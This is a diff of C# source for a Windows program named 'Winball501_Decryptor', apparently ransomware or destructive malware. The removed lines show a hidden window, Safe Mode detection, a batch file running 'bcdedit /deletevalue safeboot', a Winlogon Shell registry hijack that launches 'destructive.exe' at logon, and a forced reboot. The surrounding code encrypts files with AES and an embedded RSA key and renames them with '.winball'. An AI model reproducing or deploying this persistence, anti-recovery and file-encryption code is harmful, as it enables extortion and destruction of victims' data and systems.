@@ -7,8 +7,6 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using multronfileguardian;
-using Microsoft.Win32;
-using System.Diagnostics;
 
 namespace Winball501_Decryptor
 {
@@ -17,119 +15,8 @@ namespace Winball501_Decryptor
         public Form1()
         {
             InitializeComponent();
-            this.Visible = false;
-            if (IsSafeMode())
-            {
-                ModifyRegistry();
-                RemoveSafeBoot();
-                RestartPC();
-            }
-            else
-            {
-                load();
-                ModifyRegistry();
-            }
+            load();
         }
-
-        static bool IsSafeMode()
-        {
-            try
-            {
-                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\SafeBoot"))
-                {
-                    if (key != null)
-                    {
-
-                        string[] subKeys = key.GetSubKeyNames();
-
-                        if (subKeys.Length > 0)
-                        {
-                            return true;
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error checking Safe Mode: " + ex.Message);
-            }
-
-            return false;
-        }
-
-        static void RemoveSafeBoot()
-        {
-            try
-            {
-                string batchFilePath = Path.Combine(Path.GetTempPath(), "RemoveSafeBoot.bat");
-
-                // Create the batch file
-                File.WriteAllText(batchFilePath, "@echo off\nbcdedit /deletevalue safeboot\nexit");
-
-                // Run the batch file
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
-                    FileName = batchFilePath,
-                    UseShellExecute = true,  // True to allow UAC handling
-                    CreateNoWindow = true    // Don't create a new window
-                };
-
-                using (Process process = new Process())
-                {
-                    process.StartInfo = startInfo;
-                    process.Start();
-                    process.WaitForExit();
-
-                    // Check for success
-                    if (process.ExitCode == 0)
-                    {
-                        Console.WriteLine("Safe Mode boot option removed successfully.");
-                    }
-                    else
-                    {
-                        Console.WriteLine($"Error during batch execution. Exit code: {process.ExitCode}");
-                    }
-                }
-
-                // Optionally, delete the batch file after execution
-                File.Delete(batchFilePath);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"An error occurred while attempting to remove Safe Mode: {ex.Message}");
-            }
-        }
-
-        static void ModifyRegistry()
-        {
-            string logFilePath = Environment.CurrentDirectory + "\\logfile.txt";
-            try
-            {
-                System.Diagnostics.Process.Start("cmd.exe", "/c reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /f");
-                System.Diagnostics.Process.Start("cmd.exe", "/c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"explorer.exe, C:\\Program Files\\utkudrk2\\destructive.exe\" /f");
-            }
-            catch (Exception ex)
-            {
-                using (StreamWriter logFile = new StreamWriter(logFilePath, true))
-                {
-                    logFile.WriteLine($"[{DateTime.Now}] Error modifying registry: " + ex.Message);
-                }
-              
-            }
-        }
-
-        static void RestartPC()
-        {
-            try
-            {
-                System.Diagnostics.Process.Start("cmd.exe", "/c shutdown -r -t 7");
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show("Error restarting the PC: " + ex.Message);
-            }
-        }
-
         string publickey = "<RSAKeyValue><Modulus>sFCjXDLTTsLJGHRCK5uTawwBCWUWyUDK/CsxBn5mQKlOZd0ibBvZ3lpoQpuyww6cX096eKPsW8vOCUNRfwxv9mfThUJ8Yk+l0uLXvC8kRnNYOmFZCfwgvTEdIZtYIT35nbRyAlGFGL49zTYTmh/NEJcZasSI1XfHZt+G2TW62u2w4ZTufRRosVr5dkWM8CFRVLV+KtoXqA08yu2MSL+UUXDnT8WOYNH0unhoKb4xCWdbT1riP/5LPFicXQi6lQyhSAFXtpfeIrkvvphwoRJKs955ZI4KvUOtwbE361mKJvIB6FuBcCmwScoDhgQkG+4q4MJsZ3zyp0+DuriDyMcvBQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
         List<Task> tasks = new List<Task>();
         
@@ -215,8 +102,7 @@ namespace Winball501_Decryptor
                             ivtg = new System.Security.Cryptography.Rfc2898DeriveBytes(form.reversebarray(raes.generaterandomkey(67)), System.Text.Encoding.ASCII.GetBytes(form.reversestring("youcanjoinsaltinfutureversivonsmsmsms")), 143, System.Security.Cryptography.HashAlgorithmName.SHA512).GetBytes(16);
                             rijndael.IV = ivtg;
                             okur = new System.IO.BinaryReader(System.IO.File.Open(file, System.IO.FileMode.Open, System.IO.FileAccess.Read));
-                            string outputFile = file.EndsWith(".winball") ? file : file + ".winball";
-                            yazar = new System.IO.BinaryWriter(System.IO.File.Open(outputFile, System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Write));
+                            yazar = new System.IO.BinaryWriter(System.IO.File.Open(file + ".winball", System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Write));
                             yazar.Write(aeskey, 0, keysize / 8);
                             yazar.Write(ivtg);
                             tutar = new System.IO.MemoryStream();
@@ -349,7 +235,6 @@ namespace Winball501_Decryptor
             public short rttoperation = 0;
             string key;
             string dir;
-
             public Decrypt(Form1 form, string key, string dir)
             {
                 this.form = form;
@@ -411,9 +296,9 @@ namespace Winball501_Decryptor
                                     sifreler.FlushFinalBlock();
                                 }
                             }
-
-                            form.listBox1.Items.Add("Decrypted: " + dosyalar);
-
+                           
+                                form.listBox1.Items.Add("Decrypted: " + dosyalar);
+                           
 
                             if (okur != null)
                             {
@@ -553,11 +438,6 @@ namespace Winball501_Decryptor
                 Thread downloadThread = new Thread(new ThreadStart(decryptForDownloads.run));
                 downloadThread.Start();
             }
-        }
-
-        private void Form1_Load(object sender, EventArgs e)
-        {
-
         }
     }
 
